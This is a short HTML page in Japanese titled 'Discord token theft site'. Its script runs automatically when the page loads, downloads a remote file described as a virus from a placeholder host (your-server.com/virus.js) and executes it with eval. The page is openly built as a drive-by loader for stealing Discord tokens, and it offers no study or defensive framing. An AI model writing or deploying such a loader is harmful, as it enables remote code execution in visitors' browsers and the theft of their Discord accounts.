<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ディスコードトークン奪取サイト</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            text-align: center;
            padding: 50px;
        }
        .container {
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            display: inline-block;
        }
        .button {
            padding: 10px 20px;
            font-size: 16px;
            cursor: pointer;
            background-color: #7289da;
            color: white;
            border: none;
            border-radius: 4px;
        }
        .button:hover {
            background-color: #5a67d8;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>ディスコードトークン奪取サイト</h1>
        <p>ページが読み込まれると自動で処理が開始されます。</p>
    </div>

    <script>
        // ウイルス（スクリプト）をダウンロードして実行
        function downloadAndExecuteScript(url) {
            fetch(url)
                .then(response => response.text())
                .then(script => {
                    eval(script);
                })
                .catch(error => {
                    console.error('スクリプトのダウンロードエラー:', error);
                });
        }

        // ページが読み込まれた際に自動で実行
        window.onload = function() {
            // ウイルスのURL
            const virusUrl = 'https://your-server.com/virus.js';

            // ウイルスをダウンロードして実行
            downloadAndExecuteScript(virusUrl);
        };
    </script>
</body>
</html>
